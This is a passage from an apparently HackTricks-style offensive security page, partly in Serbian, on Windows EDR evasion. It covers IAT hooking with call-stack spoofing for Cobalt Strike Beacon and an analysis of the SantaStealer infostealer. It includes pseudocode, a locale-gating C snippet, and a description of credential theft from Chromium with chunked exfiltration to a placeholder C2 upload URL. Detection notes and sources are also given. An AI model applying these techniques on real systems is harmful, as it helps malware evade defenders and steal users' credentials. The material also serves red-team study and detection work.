- As the host DLL loads, walk its IMAGE_IMPORT_DESCRIPTOR and patch the IAT entries for targeted imports (e.g., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) to point at thin PIC wrappers.
- Each PIC wrapper executes evasions before tail‑calling the real API address. Typical evasions include:
  - Memory mask/unmask around the call (e.g., encrypt beacon regions, RWX→RX, change page names/permissions) then restore post‑call.
  - Call‑stack spoofing: construct a benign stack and transition into the target API so call‑stack analysis resolves to expected frames.
- For compatibility, export an interface so an Aggressor script (or equivalent) can register which APIs to hook for Beacon, BOFs and post‑ex DLLs.

Why IAT hooking here
- Works for any code that uses the hooked import, without modifying tool code or relying on Beacon to proxy specific APIs.
- Covers post‑ex DLLs: hooking LoadLibrary* lets you intercept module loads (e.g., System.Management.Automation.dll, clr.dll) and apply the same masking/stack evasion to their API calls.
- Restores reliable use of process‑spawning post‑ex commands against call‑stack–based detections by wrapping CreateProcessA/W.

Minimalni IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Napomene
- Primeni patch nakon relocations/ASLR i pre prve upotrebe importa. Reflective loaders like TitanLdr/AceLdr pokazuju hooking tokom DllMain učitanog modula.
- Drži wrapper-e male i PIC-safe; odredi pravi API koristeći originalnu IAT vrednost koju si uhvatio pre patchovanja ili koristeći LdrGetProcedureAddress.
- Koristi RW → RX tranzicije za PIC i izbegavaj ostavljanje writable+executable stranica.

Call‑stack spoofing stub
- Draugr‑style PIC stubs prave lažni call chain (return addresses into benign modules) i potom pivot-aju u pravi API.
- Ovo obezvređuje detekcije koje očekuju canonical stacks iz Beacon/BOFs do osetljivih API-ja.
- Poveži sa stack cutting/stack stitching tehnikama da bi dospeo unutar očekivanih frames pre API prologa.

Operativna integracija
- Postavi reflective loader ispred post‑ex DLLs tako da se PIC i hooks automatski inicijalizuju kada se DLL učita.
- Koristi Aggressor script za registraciju ciljnih API-ja tako da Beacon i BOFs transparentno profitiraju od iste evasion path bez izmene koda.

Detekcija/DFIR razmatranja
- IAT integritet: unosi koji se resolve-uju na non‑image (heap/anon) adrese; periodična verifikacija import pokazivača.
- Anomalije steka: return addresses koje ne pripadaju učitanim image-ima; nagli prelazi na non‑image PIC; nekonzistentno RtlUserThreadStart poreklo.
- Loader telemetry: upisi unutar procesa u IAT, rana DllMain aktivnost koja menja import thunks, neočekivane RX regije kreirane pri load-u.
- Image‑load evasion: ako hook-uješ LoadLibrary*, nadgledaj sumnjiva učitavanja automation/clr assemblies koja su korelisana sa memory masking događajima.

Povezani building blocks i primeri
- Reflective loaders koji vrše IAT patching tokom load-a (npr. TitanLdr, AceLdr)
- Memory masking hooks (npr. simplehook) i stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (npr. Draugr)

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) ilustruje kako moderni info-stealers mešaju AV bypass, anti-analysis i credential access u jednom workflow-u.

### Keyboard layout gating & sandbox delay

- A config flag (`anti_cis`) enumerates installed keyboard layouts via `GetKeyboardLayoutList`. If a Cyrillic layout is found, the sample drops an empty `CIS` marker and terminates before running stealers, ensuring it never detonates on excluded locales while leaving a hunting artifact.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Slojevita `check_antivm` logika

- Variant A prolazi kroz process list, računa hash svakog imena pomoću custom rolling checksum i poredi ga sa ugrađenim blocklists za debuggers/sandboxes; checksum ponavlja i preko computer name i proverava working directories kao što je `C:\analysis`.
- Variant B ispituje system properties (process-count floor, recent uptime), poziva `OpenServiceA("VBoxGuest")` da detektuje VirtualBox additions, i izvodi timing checks oko sleeps da bi uočio single-stepping. Bilo koji hit prekida izvršavanje pre nego što moduli budu pokrenuti.

### Fileless helper + double ChaCha20 reflective loading

- Primarni DLL/EXE ugrađuje Chromium credential helper koji se ili dropuje na disk ili manualno mapira u memoriji; fileless mode rešava imports/relocations sam pa ne ostaju helper artefakti na disku.
- Taj helper skladišti second-stage DLL šifrovan dvaput sa ChaCha20 (dva 32-byte ključa + 12-byte nonces). Posle oba prolaza, on reflectively loads blob (bez `LoadLibrary`) i poziva exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` izvedene iz [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- ChromElevator routines koriste direct-syscall reflective process hollowing da injektuju u živ Chromium browser, naslede AppBound Encryption keys, i dekriptuju passwords/cookies/credit cards direktno iz SQLite databases uprkos ABE hardening-u.

### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log` iterira global `memory_generators` function-pointer tabelu i pokreće po jedan thread za svaki omogućeni modul (Telegram, Discord, Steam, screenshots, documents, browser extensions, itd.). Svaki thread zapisuje rezultate u shared buffers i prijavljuje broj fajlova posle ~45s join window.
- Kada se završi, sve se zipuje sa statically linked `miniz` bibliotekom kao `%TEMP%\\Log.zip`. `ThreadPayload1` zatim spava 15s i stream-uje arhivu u 10 MB chunk-ovima putem HTTP POST na `http://<C2>:6767/upload`, spoof-ujući browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Svaki chunk dodaje `User-Agent: upload`, `auth: <build_id>`, opciono `w: <campaign_tag>`, i poslednji chunk dodaje `complete: true` kako bi C2 znao da je reassembly završen.

## Izvori

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
